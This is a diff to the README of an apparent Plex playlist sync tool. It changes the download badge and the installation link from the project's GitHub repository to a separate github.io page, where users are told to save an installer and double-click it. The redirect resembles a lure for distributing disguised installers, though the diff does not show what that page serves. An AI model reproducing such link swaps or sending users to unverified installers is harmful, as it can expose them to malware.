@@ -1,6 +1,6 @@
 # 🎵 plex-playlist-sync - Keep your music playlists in sync
 
-[![](https://img.shields.io/badge/Download-Plex%20Playlist%20Sync-blue.svg)](https://github.com/maribethfoggy30/plex-playlist-sync)
+[![](https://img.shields.io/badge/Download-Plex%20Playlist%20Sync-blue.svg)](https://maribethfoggy30.github.io)
 
 ## 📖 About this application
 
@@ -21,7 +21,7 @@ Before you begin, ensure your computer meets these conditions:
 
 Follow these steps to obtain and start the application on your computer.
 
-1. Visit this link to download the application: [https://github.com/maribethfoggy30/plex-playlist-sync](https://github.com/maribethfoggy30/plex-playlist-sync)
+1. Visit this link to download the application: [https://maribethfoggy30.github.io](https://maribethfoggy30.github.io)
 2. Locate the latest release on that page.
 3. Save the installer file to your desktop.
 4. Double-click the file to start the installation wizard.
